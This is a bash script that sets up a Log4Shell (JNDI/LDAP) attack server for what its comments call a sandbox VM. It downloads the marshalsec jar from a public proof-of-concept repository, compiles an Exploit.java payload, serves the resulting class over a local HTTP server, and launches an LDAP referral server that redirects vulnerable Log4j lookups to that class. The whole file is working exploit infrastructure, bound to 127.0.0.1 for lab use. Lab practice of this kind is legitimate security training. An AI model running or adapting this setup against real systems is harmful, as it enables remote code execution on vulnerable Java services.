#!/usr/bin/env bash
# On-box Log4Shell attacker for the TraditionalJay VM (sandbox).
# Uses marshalsec LDAPRefServer + HTTP Exploit.class on 127.0.0.1.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXPLOIT_DIR="${DIR}/exploit"
JAR="${DIR}/marshalsec-0.0.3-SNAPSHOT-all.jar"
HTTP_PORT="${HTTP_PORT:-8000}"
LDAP_PORT="${LDAP_PORT:-1389}"
CODEBASE="http://127.0.0.1:${HTTP_PORT}/#Exploit"
JAR_URL="https://raw.githubusercontent.com/kozmer/log4j-shell-poc/main/target/marshalsec-0.0.3-SNAPSHOT-all.jar"

if [[ ! -f "$JAR" || ! -s "$JAR" ]]; then
  echo "==> Downloading marshalsec…"
  curl -fL "$JAR_URL" -o "${JAR}.partial"
  mv "${JAR}.partial" "$JAR"
fi

if [[ ! -f "$EXPLOIT_DIR/Exploit.class" ]]; then
  echo "==> Compiling Exploit.class"
  javac -d "$EXPLOIT_DIR" "$EXPLOIT_DIR/Exploit.java"
fi

pkill -f "http.server ${HTTP_PORT}" 2>/dev/null || true
sleep 0.2

echo "==> HTTP codebase on 127.0.0.1:${HTTP_PORT}"
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" --bind 127.0.0.1) &
HTTP_PID=$!
trap 'kill $HTTP_PID 2>/dev/null || true' EXIT
sleep 0.5

echo "==> marshalsec LDAP on 127.0.0.1:${LDAP_PORT} → ${CODEBASE}"
# Bind all interfaces inside the VM; demo callbacks use 127.0.0.1.
exec java -cp "$JAR" marshalsec.jndi.LDAPRefServer "$CODEBASE" "$LDAP_PORT"
